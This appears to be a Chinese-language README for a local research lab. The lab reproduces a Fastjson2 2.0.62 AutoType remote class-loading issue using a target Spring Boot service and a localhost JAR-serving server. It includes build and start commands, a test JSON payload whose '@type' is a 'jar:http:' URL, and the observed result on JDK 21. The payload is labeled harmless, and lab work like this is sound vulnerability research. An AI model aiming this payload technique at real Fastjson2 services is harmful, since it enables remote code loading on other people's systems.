# Fastjson2 2.0.62 本地手动仿真环境

这是**本地手动启动版**，直接两个 Java 进程即可。

## 环境结构

- `fastjson2-fatjar-safe-lab`：标准 Spring Boot Fat JAR，提供 `POST /parse`
- `remote-payload-server`：独立 HTTP 服务，提供：
  - `GET /safe`：返回固定远程 JAR
  - `GET /health`：健康检查
- 解析方式：标准 Fastjson2 API，`JSONReader.autoTypeFilter(...)`
- 目标 DTO：`RequestBody { Object c; }`

也就是说，这个环境模拟的是比较常见的：

- Web 接口收 JSON
- 业务对象里有 `Object` 字段
- Fastjson2 配了 AutoType 白名单
- 运行方式是正常 `java -jar`

不是之前那种：

- 固定请求体
- 反射写 `acceptHashCodes`
- 反射写 `acceptHashCodes`


## 先构建

最简单：

```powershell
.\build-all.ps1
```

等价手动命令：

```powershell
Set-Location .\remote-payload-server
mvn -q clean package
Set-Location ..\fastjson2-fatjar-safe-lab
mvn -q clean package
```

## 手动启动

### 窗口 1：启动远程服务

最简单：

```powershell
.\start-remote.ps1 -JavaExe 'D:\security\JDKs-cyber\oracle_JDKs\JDK8u65\bin\java.exe'
```

等价手动命令：

```powershell
Set-Location .\remote-payload-server
& 'D:\security\JDKs-cyber\oracle_JDKs\JDK8u65\bin\java.exe' -jar .\target\remote-payload-server-1.0.0-all.jar
```

启动成功会看到：

```text
READY http://localhost:19090/safe
HEALTH http://localhost:19090/health
```

### 窗口 2：启动目标服务

最简单：

```powershell
.\start-target.ps1 -JavaExe 'D:\security\JDKs-cyber\oracle_JDKs\JDK8u65\bin\java.exe'
```

等价手动命令：

```powershell
Set-Location .\fastjson2-fatjar-safe-lab
& 'D:\security\JDKs-cyber\oracle_JDKs\JDK8u65\bin\java.exe' '-Dfastjson2.parser.safeMode=false' -jar .\target\fastjson2-fatjar-safe-lab-1.0.0.jar
```

启动成功后监听：

```text
http://127.0.0.1:18080
```

### 窗口 3：测试

最简单：

```powershell
.\test-local.ps1
```

等价手动命令：

```powershell
curl.exe --http1.1 -sS http://localhost:19090/health

$body = '{"c":{"@type":"jar:http:..localhost:19090.safe!.lab.Allowed.RemoteHarmless"}}'
curl.exe --http1.1 -sS -X POST -H 'Content-Type: application/json' --data-binary $body http://127.0.0.1:18080/parse
```

## 你会看到什么

### 1) `/health`

正常返回：

```text
ok
```

### 2) `/parse`

返回里关键字段：

- `simulationMode=standard-fastjson2-autoTypeFilter`
- `applicationClassLoader=org.springframework.boot.loader.LaunchedURLClassLoader`
- `remoteUrl=jar:http://localhost:19090/safe`

### 3) 远程服务窗口

如果链路触达远程 JAR，会看到：

```text
GET /safe #1 bytes=...
```

## 为什么现在更“正规”

因为现在走的是：

- Spring Boot 正常 Fat JAR 启动
- Fastjson2 官方 `autoTypeFilter(...)`
- 普通 HTTP 服务 + 普通 JSON 请求
- 本地两个独立进程

这和一般手工搭环境、更接近日常业务代码的方式一致。

## 当前实测

在本机 **2026-08-31** 手动测试：

- 远程服务正常启动
- 目标服务正常启动
- `/health` 正常
- `/parse` 能触发远程 `GET /safe`
- JDK 21 下最终报：`ClassFormatError: Illegal class name`

这表示：

- 远程 JAR 获取链路已到达
- 但在 JDK 21 上，URL 形态类名继续定义时会被更严格校验拦住

## 关键文件

- `start-remote.ps1`
- `start-target.ps1`
- `test-local.ps1`
- `build-all.ps1`
- `fastjson2-fatjar-safe-lab/src/main/java/lab/fatjar/service/FastjsonParseService.java`
- `remote-payload-server/src/main/java/lab/payload/UrlNamedPayloadServer.java`



